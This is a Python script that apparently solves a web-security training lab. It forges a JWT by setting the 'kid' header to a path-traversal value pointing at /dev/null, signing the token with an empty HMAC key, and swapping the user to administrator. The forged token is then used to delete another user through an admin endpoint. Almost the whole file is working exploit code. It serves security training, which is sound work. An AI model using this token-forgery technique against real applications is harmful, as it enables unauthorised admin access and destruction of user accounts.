import sys
import requests
import re
import hmac
import hashlib
import base64


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'

    def get_csrf(self):
        response = requests.get(self.lab_url + 'login')
        return re.search('value="(.*)"', response.text).group(1)

    def get_jwt_token(self):
        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
        session = requests.Session()
        session.post(self.lab_url + 'login', data=data)
        return session.cookies['session']

    @staticmethod
    def generate_hs256_signature(secret_key, data):
        secret_key = bytes(secret_key, 'utf-8')
        data = bytes(data, 'utf-8')
        signature = hmac.new(secret_key, data, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def generate_malicious_token(self):
        token = self.get_jwt_token()
        header, payload, _ = token.split('.')
        header += '=' * (len(payload) % 4)
        header = base64.urlsafe_b64decode(header)
        kid = re.search(b'kid":"(.*)",', header).group(1)
        header = re.sub(kid, b'../../../../dev/null', header)
        header = base64.urlsafe_b64encode(header).rstrip(b'=')
        payload += '=' * (len(payload) % 4)
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(b'wiener', b'administrator')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        data = header.decode() + '.' + payload.decode()
        signature = self.generate_hs256_signature('', data)
        return header.decode() + '.' + payload.decode() + '.' + signature

    def delete_the_user(self):
        cookies = {'session': self.generate_malicious_token()}
        response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
        if 'wiener' in response.text and 'carlos' not in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1])
solver.start()
